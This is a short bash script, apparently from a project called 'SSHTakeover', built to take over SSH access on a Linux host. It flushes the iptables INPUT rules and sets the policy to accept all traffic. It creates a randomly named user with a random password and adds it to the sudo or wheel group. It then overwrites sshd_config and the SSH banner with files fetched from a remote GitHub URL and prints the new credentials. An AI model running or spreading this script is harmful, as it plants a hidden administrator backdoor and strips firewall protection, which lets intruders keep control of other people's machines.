#!/bin/bash
echo Intalling SSH...;
if [ -f /usr/bin/yum ]; then yum install openssh* -y; fi;
if [ -f /usr/bin/apt ]; then apt install ssh -y; fi;
echo 'Flushing iptables input'
iptables -F INPUT;
iptables -P INPUT ACCEPT;
echo Adding new admin account...;
random_number=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1);
random_user=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 6 | head -n 1);
useradd -m $random_user;
echo $random_user:$random_number | chpasswd;
if [ -f /usr/bin/yum ]; then usermod -aG wheel  . $random_user . ; fi;
if [ -f /usr/bin/apt ]; then usermod -g sudo $random_user; fi;
echo Configuring SSH...;
wget -O /etc/ssh/sshd_banner https://github.com/ind3p3nd3nt/SSHTakeover/raw/master/sshd_banner
wget -O /etc/ssh/sshd_config https://github.com/ind3p3nd3nt/SSHTakeover/raw/master/sshd_config
if [ -f /usr/bin/yum ]; then service sshd restart; fi;
if [ -f /usr/bin/apt ]; then service ssh restart; fi;
arr4y="Added admin:, $random_user, password:, $random_number, Start SSHd with: sudo service ssh start (debian) or sudo service sshd start (centos)";
echo $arr4y;
